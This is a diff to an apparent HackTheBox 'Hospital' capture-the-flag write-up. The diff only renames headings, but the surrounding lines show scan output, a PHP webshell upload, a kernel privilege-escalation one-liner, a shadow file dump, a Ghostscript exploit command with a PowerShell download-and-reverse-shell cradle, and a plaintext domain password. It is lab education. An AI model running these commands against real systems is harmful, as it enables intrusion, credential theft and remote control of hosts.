@@ -1,4 +1,5 @@
-# Nmap
+# HackTheBox Hospital Writeup
+## Nmap
 ```bash
 Nmap scan report for 10.10.11.241
 Host is up, received user-set (0.017s latency).
@@ -36,7 +37,7 @@ PORT      STATE SERVICE           REASON          VERSION
 32375/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
 ```
 
-## Dirbuster on port 8080
+### Dirbuster on port 8080
 ```
 http://10.10.11.241:8080/config.php           (Status: 200) [Size: 0]
 http://10.10.11.241:8080/css                  (Status: 403) [Size: 279]
@@ -55,7 +56,7 @@ http://10.10.11.241:8080/uploads              (Status: 403) [Size: 279]
 http://10.10.11.241:8080/vendor               (Status: 403) [Size: 279]
 ```
 
-## Port 8080 Unrestricted file upload
+### Port 8080 Unrestricted file upload
 ```
 1. Register a user.
 2. Try to upload a file.
@@ -64,7 +65,7 @@ http://10.10.11.241:8080/vendor               (Status: 403) [Size: 279]
 ```
 ![Intruder](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/HTB%20Hospital1.png)
 
-## PHP Reverse Shell
+### PHP Reverse Shell
 ```bash
 Assumed this is a windows machine so i wasted time trying to find a Windows PHP shell and upload an exe. Turns out its a linux env =.=
 Shell used: https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php
@@ -87,7 +88,7 @@ www-data@webserver:/var/www/html/uploads$ uname -a
 Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-## CVE-2023-2640
+### CVE-2023-2640
 ```bash
 www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
 <share -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
@@ -138,7 +139,7 @@ lxd:!:19612::::::
 mysql:!:19620::::::
 ```
 
-# Port 443
+## Port 443
 ```bash
 # https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
 python3 CVE_2023_36664_exploit.py -f file.eps -p "powershell.exe -nop -ep bypass -c \"iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.3:80/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 1234\"" -g -x eps
@@ -147,7 +148,7 @@ python3 CVE_2023_36664_exploit.py -f file.eps -p "powershell.exe -nop -ep bypass
 Send file.eps.eps as attachment after login as drwilliams
 ```
 
-# User Flag
+## User Flag
 ```powershell
 rlwrap nc -lnvp 1234
 listening on [any] 1234 ...
@@ -171,7 +172,7 @@ set filename=%~1
 powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
 ```
 
-# Root Flag
+## Root Flag
 ```bash
 rdesktop -u drbrown 10.10.11.241
 
